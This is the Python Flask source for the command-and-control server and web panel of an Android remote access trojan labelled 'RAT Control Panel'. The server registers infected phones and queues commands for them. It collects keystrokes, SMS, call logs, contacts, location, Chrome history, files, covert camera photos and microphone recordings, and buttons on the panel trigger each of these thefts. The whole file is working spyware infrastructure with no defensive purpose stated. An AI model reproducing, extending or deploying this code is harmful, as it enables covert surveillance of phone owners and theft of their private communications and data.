from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import json
import os
import threading
import time

app = Flask(__name__)

# ---- Storage ----
log_entries = []        # All events received
command_queue = []      # Commands waiting to be picked up
command_results = {}    # Results from executed commands (keyed by cmd_id)
devices = {}            # Connected devices: {device_id: {last_seen, ip, ...}}

try:
    with open('/tmp/rat_data.json') as f:
        saved = json.load(f)
        log_entries = saved.get('events', [])
        devices = saved.get('devices', {})
except:
    pass

def save_to_disk():
    with open('/tmp/rat_data.json', 'w') as f:
        json.dump({'events': log_entries, 'devices': devices}, f, indent=2)

# ---- Device heartbeat cleanup ----
def cleanup_stale_devices():
    while True:
        time.sleep(60)
        now = datetime.now().isoformat()
        stale = [d for d, info in devices.items() 
                 if (datetime.now() - datetime.fromisoformat(info.get('last_seen', now))).seconds > 300]
        for d in stale:
            del devices[d]

threading.Thread(target=cleanup_stale_devices, daemon=True).start()

# =============================================
# DEVICE ENDPOINTS (called by the app)
# =============================================

@app.route('/api/register', methods=['POST'])
def register_device():
    """Device registers itself when app starts."""
    data = request.get_json()
    device_id = data.get('device_id', 'unknown')
    devices[device_id] = {
        'device_id': device_id,
        'model': data.get('model', 'Unknown'),
        'android_version': data.get('android_version', 'Unknown'),
        'first_seen': datetime.now().isoformat(),
        'last_seen': datetime.now().isoformat(),
        'ip': request.remote_addr,
        'online': True,
    }
    save_to_disk()
    return jsonify({'status': 'ok', 'device_id': device_id})

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    """Device sends heartbeat to stay online."""
    data = request.get_json()
    device_id = data.get('device_id', 'unknown')
    if device_id in devices:
        devices[device_id]['last_seen'] = datetime.now().isoformat()
        devices[device_id]['online'] = True
        devices[device_id]['ip'] = request.remote_addr
    save_to_disk()
    return jsonify({'status': 'ok'})

@app.route('/api/cmd', methods=['GET'])
def get_commands():
    """Device polls this to get pending commands."""
    device_id = request.args.get('device_id', 'unknown')
    
    # Update device heartbeat
    if device_id in devices:
        devices[device_id]['last_seen'] = datetime.now().isoformat()
        devices[device_id]['online'] = True
    
    # Find commands for this device (or broadcast commands)
    cmds = []
    remaining = []
    for cmd in command_queue:
        target = cmd.get('target_device', 'all')
        if target == 'all' or target == device_id:
            cmd['status'] = 'sent'
            cmd['sent_at'] = datetime.now().isoformat()
            cmds.append(cmd)
        else:
            remaining.append(cmd)
    
    # Remove sent commands from queue
    command_queue.clear()
    command_queue.extend(remaining)
    
    return jsonify({
        'commands': cmds,
        'queue_size': len(command_queue),
    })

@app.route('/api/result', methods=['POST'])
def post_result():
    """Device posts the result of an executed command."""
    data = request.get_json()
    cmd_id = data.get('cmd_id', 'unknown')
    data['server_received_at'] = datetime.now().isoformat()
    
    command_results[cmd_id] = data
    
    # Also add to event log
    log_entries.append({
        'type': 'command_result',
        'timestamp': datetime.now().isoformat(),
        'data': data,
    })
    
    save_to_disk()
    return jsonify({'status': 'ok'})

@app.route('/api/log', methods=['POST'])
def post_log():
    """Receive events (keystrokes, SMS, calls, etc.)"""
    try:
        data = request.get_json()
        data['server_received_at'] = datetime.now().isoformat()
        log_entries.append(data)
        
        if len(log_entries) > 2000:
            log_entries.pop(0)
        
        save_to_disk()
        return jsonify({'status': 'ok', 'total_events': len(log_entries)})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/log', methods=['GET'])
def get_logs():
    category = request.args.get('category', '').lower()
    if category:
        filtered = [e for e in log_entries if category in e.get('type', '').lower()]
        return jsonify({'total_events': len(filtered), 'category': category, 'events': filtered})
    return jsonify({'total_events': len(log_entries), 'events': log_entries})

# =============================================
# OPERATOR ENDPOINTS (called by the web panel)
# =============================================

@app.route('/api/devices', methods=['GET'])
def get_devices():
    """Return list of connected devices."""
    return jsonify({'devices': list(devices.values())})

@app.route('/api/send_cmd', methods=['POST'])
def send_command():
    """Operator sends a command to a device."""
    data = request.get_json()
    cmd_id = f"cmd_{int(time.time() * 1000)}"
    
    command = {
        'cmd_id': cmd_id,
        'command': data.get('command', 'ping'),
        'params': data.get('params', {}),
        'target_device': data.get('target_device', 'all'),
        'created_at': datetime.now().isoformat(),
        'status': 'pending',
    }
    
    command_queue.append(command)
    save_to_disk()
    
    return jsonify({'status': 'ok', 'cmd_id': cmd_id, 'message': f'Command queued for {data.get("target_device", "all devices")}'})

@app.route('/api/result/<cmd_id>', methods=['GET'])
def get_result(cmd_id):
    """Get the result of a specific command."""
    result = command_results.get(cmd_id)
    if result:
        return jsonify({'found': True, 'result': result})
    return jsonify({'found': False, 'message': 'Result not yet available'})

@app.route('/api/stats', methods=['GET'])
def get_stats():
    stats = {}
    for event in log_entries:
        event_type = event.get('type', 'unknown')
        if 'sms' in event_type.lower():
            cat = 'sms'
        elif 'call' in event_type.lower():
            cat = 'call'
        elif 'location' in event_type.lower():
            cat = 'location'
        elif 'photo' in event_type.lower() or 'camera' in event_type.lower() or 'capture' in event_type.lower():
            cat = 'camera'
        elif 'audio' in event_type.lower() or 'record' in event_type.lower() or 'mic' in event_type.lower():
            cat = 'audio'
        elif 'accessibility' in event_type.lower():
            cat = 'accessibility'
        elif 'file' in event_type.lower() or 'scan' in event_type.lower() or 'directory' in event_type.lower():
            cat = 'file'
        elif 'command' in event_type.lower():
            cat = 'command'
        else:
            cat = 'other'
        stats[cat] = stats.get(cat, 0) + 1
    
    return jsonify({
        'total_events': len(log_entries),
        'categories': stats,
        'devices_online': sum(1 for d in devices.values() if d.get('online')),
        'pending_commands': len(command_queue),
    })

# =============================================
# WEB CONTROL PANEL
# =============================================

@app.route('/')
def control_panel():
    return render_template_string(CONTROL_PANEL_HTML)

CONTROL_PANEL_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>RAT Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #0f0; min-height: 100vh; }
        .container { max-width: 1400px; margin: 0 auto; padding: 15px; }
        
        .header { 
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px; background: #111; border-radius: 8px; margin-bottom: 15px;
            flex-wrap: wrap; gap: 10px;
        }
        .header h1 { font-size: 1.3rem; color: #0f0; }
        
        .grid { display: grid; grid-template-columns: 280px 1fr; gap: 15px; }
        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
        
        .panel {
            background: #111; border: 1px solid #222; border-radius: 8px;
            padding: 15px; margin-bottom: 15px;
        }
        .panel h2 { font-size: 0.9rem; color: #0f0; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
        
        .device-card {
            background: #0a0a0a; border: 1px solid #222; border-radius: 6px;
            padding: 10px; margin-bottom: 8px; font-size: 0.75rem;
        }
        .device-card.online { border-color: #0f0; }
        .device-card.offline { border-color: #f00; opacity: 0.5; }
        .device-card.selected { border-color: #0ff; background: #0a1a1a; }
        
        .cmd-btn {
            display: block; width: 100%; padding: 10px; margin: 5px 0;
            background: #1a1a1a; color: #0f0; border: 1px solid #333;
            border-radius: 4px; cursor: pointer; font-family: monospace;
            font-size: 0.8rem; text-align: left; transition: all 0.2s;
        }
        .cmd-btn:hover { background: #0f0; color: #0a0a0a; }
        .cmd-btn.danger { color: #f44; border-color: #f44; }
        .cmd-btn.danger:hover { background: #f44; color: #0a0a0a; }
        
        .output-area {
            background: #050505; border: 1px solid #222; border-radius: 6px;
            padding: 12px; min-height: 200px; max-height: 500px;
            overflow-y: auto; font-size: 0.75rem; white-space: pre-wrap;
            word-break: break-all;
        }
        
        .status-bar {
            display: flex; justify-content: space-between; align-items: center;
            padding: 8px 15px; background: #111; border-radius: 6px;
            font-size: 0.7rem; flex-wrap: wrap; gap: 10px;
        }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .status-dot.online { background: #0f0; }
        .status-dot.offline { background: #f00; }
        
        .toast {
            position: fixed; top: 20px; right: 20px; padding: 12px 20px;
            border-radius: 6px; font-size: 0.8rem; z-index: 1000;
            animation: fadeIn 0.3s;
        }
        .toast.success { background: #0f0; color: #0a0a0a; }
        .toast.error { background: #f44; color: #fff; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ RAT Control Panel</h1>
            <div id="stats"></div>
        </div>
        
        <div class="status-bar">
            <span>Devices: <strong id="deviceCount">0</strong></span>
            <span>Events: <strong id="eventCount">0</strong></span>
            <span>Pending: <strong id="pendingCount">0</strong></span>
            <span id="lastUpdate">Last update: --</span>
            <button onclick="refreshAll()" style="background:#0f0;color:#000;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;">🔄 Refresh</button>
        </div>
        
        <div class="grid">
            <!-- LEFT: DEVICES + COMMANDS -->
            <div>
                <div class="panel">
                    <h2>📱 Connected Devices</h2>
                    <div id="deviceList"><p style="color:#666;">No devices connected</p></div>
                </div>
                
                <div class="panel">
                    <h2>⚡ Quick Commands</h2>
                    <button class="cmd-btn" onclick="sendCmd('get_sms_inbox')">📥 Get SMS Inbox</button>
                    <button class="cmd-btn" onclick="sendCmd('get_call_logs')">📞 Get Call Logs</button>
                    <button class="cmd-btn" onclick="sendCmd('get_contacts')">👥 Get Contacts</button>
                    <button class="cmd-btn" onclick="sendCmd('get_installed_apps')">📦 Installed Apps</button>
                    <button class="cmd-btn" onclick="sendCmd('capture_photo', {camera: 'back'})">📸 Capture Back Camera</button>
                    <button class="cmd-btn" onclick="sendCmd('capture_photo', {camera: 'front'})">🤳 Capture Front Camera</button>
                    <button class="cmd-btn" onclick="sendCmd('record_audio', {duration: 15})">🎙️ Record Audio (15s)</button>
                    <button class="cmd-btn" onclick="sendCmd('get_location')">📍 Get Location</button>
                    <button class="cmd-btn" onclick="sendCmd('scan_files', {path: '/storage/emulated/0/DCIM'})">📁 Scan DCIM</button>
                    <button class="cmd-btn" onclick="sendCmd('get_chrome_history')">🌐 Chrome History</button>
                    <button class="cmd-btn danger" onclick="sendCmd('ping')">🔍 Ping Device</button>
                </div>
            </div>
            
            <!-- RIGHT: OUTPUT -->
            <div>
                <div class="panel">
                    <h2>📋 Command Output</h2>
                    <div class="output-area" id="output">Select a device and send a command to see output here.</div>
                </div>
                
                <div class="panel">
                    <h2>📊 Recent Events</h2>
                    <div class="output-area" id="events" style="max-height:250px;">Loading events...</div>
                </div>
            </div>
        </div>
    </div>
    
    <div id="toastContainer"></div>
    
    <script>
        let selectedDevice = 'all';
        let devices = [];
        
        function toast(msg, type) {
            const container = document.getElementById('toastContainer');
            const t = document.createElement('div');
            t.className = 'toast ' + type;
            t.textContent = msg;
            container.appendChild(t);
            setTimeout(() => t.remove(), 3000);
        }
        
        async function refreshAll() {
            await Promise.all([loadDevices(), loadStats(), loadEvents()]);
            document.getElementById('lastUpdate').textContent = 'Last update: ' + new Date().toLocaleTimeString();
        }
        
        async function loadDevices() {
            try {
                const res = await fetch('/api/devices');
                const data = await res.json();
                devices = data.devices || [];
                renderDevices();
                document.getElementById('deviceCount').textContent = devices.filter(d => d.online).length;
            } catch(e) { console.error(e); }
        }
        
        function renderDevices() {
            const container = document.getElementById('deviceList');
            if (devices.length === 0) {
                container.innerHTML = '<p style="color:#666;">No devices connected</p>';
                return;
            }
            container.innerHTML = devices.map(d => `
                <div class="device-card ${d.online ? 'online' : 'offline'} ${selectedDevice === d.device_id ? 'selected' : ''}"
                     onclick="selectDevice('${d.device_id}')">
                    <strong>${d.device_id}</strong><br>
                    ${d.model} | Android ${d.android_version}<br>
                    <span class="status-dot ${d.online ? 'online' : 'offline'}"></span>
                    ${d.online ? 'Online' : 'Offline'} | IP: ${d.ip}
                </div>
            `).join('');
        }
        
        function selectDevice(id) {
            selectedDevice = id;
            renderDevices();
            document.getElementById('output').textContent = 'Selected: ' + id + '\\nSend a command from the left panel.';
        }
        
        async function sendCmd(command, params = {}) {
            if (selectedDevice === 'all') {
                if (!confirm('Send to ALL devices?')) return;
            }
            
            document.getElementById('output').textContent = 'Sending: ' + command + '...';
            
            try {
                const res = await fetch('/api/send_cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        command: command,
                        params: params,
                        target_device: selectedDevice,
                    })
                });
                const data = await res.json();
                toast('Command sent: ' + data.message, 'success');
                document.getElementById('output').textContent = 
                    'Command queued: ' + command + '\\nCmd ID: ' + data.cmd_id + '\\n\\nWaiting for device to execute...\\n(Device polls every 5 seconds)';
                
                // Poll for result
                setTimeout(() => pollResult(data.cmd_id), 3000);
            } catch(e) {
                toast('Failed to send command', 'error');
            }
        }
        
        async function pollResult(cmdId) {
            try {
                const res = await fetch('/api/result/' + cmdId);
                const data = await res.json();
                if (data.found) {
                    document.getElementById('output').textContent = 
                        '✅ RESULT RECEIVED\\n' + 
                        'Cmd ID: ' + cmdId + '\\n' +
                        JSON.stringify(data.result, null, 2);
                } else {
                    document.getElementById('output').textContent += '\\n⏳ Still waiting... (polling again in 5s)';
                    setTimeout(() => pollResult(cmdId), 5000);
                }
            } catch(e) {
                setTimeout(() => pollResult(cmdId), 5000);
            }
        }
        
        async function loadStats() {
            try {
                const res = await fetch('/api/stats');
                const data = await res.json();
                document.getElementById('eventCount').textContent = data.total_events;
                document.getElementById('pendingCount').textContent = data.pending_commands;
            } catch(e) { console.error(e); }
        }
        
        async function loadEvents() {
            try {
                const res = await fetch('/api/log');
                const data = await res.json();
                const events = (data.events || []).slice(-20).reverse();
                document.getElementById('events').innerHTML = events.map(e => 
                    `<div style="margin-bottom:6px;border-left:3px solid ${getColor(e.type)};padding-left:8px;">
                        <span style="color:#888;">${(e.timestamp || '').substring(0,19)}</span>
                        <span style="color:#0ff;">[${e.type || 'unknown'}]</span>
                        ${getPreview(e.data || {})}
                    </div>`
                ).join('') || '<p style="color:#666;">No events</p>';
            } catch(e) { console.error(e); }
        }
        
        function getColor(type) {
            if (type.includes('sms')) return '#0ff';
            if (type.includes('call')) return '#ff0';
            if (type.includes('location')) return '#0f0';
            if (type.includes('camera') || type.includes('photo')) return '#f0f';
            if (type.includes('audio') || type.includes('record')) return '#f44';
            if (type.includes('accessibility')) return '#f06';
            if (type.includes('file') || type.includes('scan')) return '#f80';
            return '#888';
        }
        
        function getPreview(data) {
            if (typeof data !== 'object') return String(data).substring(0, 100);
            const str = JSON.stringify(data);
            return str.length > 100 ? str.substring(0, 100) + '...' : str;
        }
        
        // Auto-refresh
        setInterval(refreshAll, 10000);
        refreshAll();
    </script>
</body>
</html>
'''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)